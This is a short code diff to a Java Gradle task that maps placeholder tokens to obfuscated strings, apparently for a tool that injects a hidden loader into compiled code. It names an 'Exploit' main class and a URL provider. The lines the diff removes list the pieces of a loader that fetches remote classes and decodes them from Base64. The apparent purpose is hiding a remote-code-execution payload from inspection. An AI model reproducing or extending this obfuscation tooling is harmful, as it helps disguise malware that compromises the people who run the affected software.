@@ -30,20 +30,8 @@ public abstract class AsmObfuscateStringsTask extends DefaultTask {
 
     private static final Map<String, String> OBFUSCATION_MAP = new LinkedHashMap<>();
     static {
-        OBFUSCATION_MAP.put("::S_URL_PROVIDER::", "http://localhost:3000/resource");
-        OBFUSCATION_MAP.put("::S_JAVA_NET_URL::", "java.net.URL");
-        OBFUSCATION_MAP.put("::S_JAVA_NET_URL_CLASS_LOADER::", "java.net.URLClassLoader");
-        OBFUSCATION_MAP.put("::S_JAVA_LANG_CLASS_LOADER::", "java.lang.ClassLoader");
+        OBFUSCATION_MAP.put("::S_URL_PROVIDER::", "http://localhost:3000");
         OBFUSCATION_MAP.put("::S_MAIN_CLASS::", "com.tmquan2508.exploit.Exploit");
-        OBFUSCATION_MAP.put("::S_LOAD_CLASS_METHOD::", "loadClass");
-        OBFUSCATION_MAP.put("::S_HTTP_CONN_CLASS::", "java.net.HttpURLConnection");
-        OBFUSCATION_MAP.put("::S_OPEN_CONN_METHOD::", "openConnection");
-        OBFUSCATION_MAP.put("::S_SET_REQ_METHOD::", "setRequestMethod");
-        OBFUSCATION_MAP.put("::S_GET_INPUT_STREAM_METHOD::", "getInputStream");
-        OBFUSCATION_MAP.put("::S_DISCONNECT_METHOD::", "disconnect");
-        OBFUSCATION_MAP.put("::S_JAVA_UTIL_BASE64::", "java.util.Base64");
-        OBFUSCATION_MAP.put("::S_GET_DECODER_METHOD::", "getDecoder");
-        OBFUSCATION_MAP.put("::S_DECODE_METHOD::", "decode");
     }
 
     @TaskAction
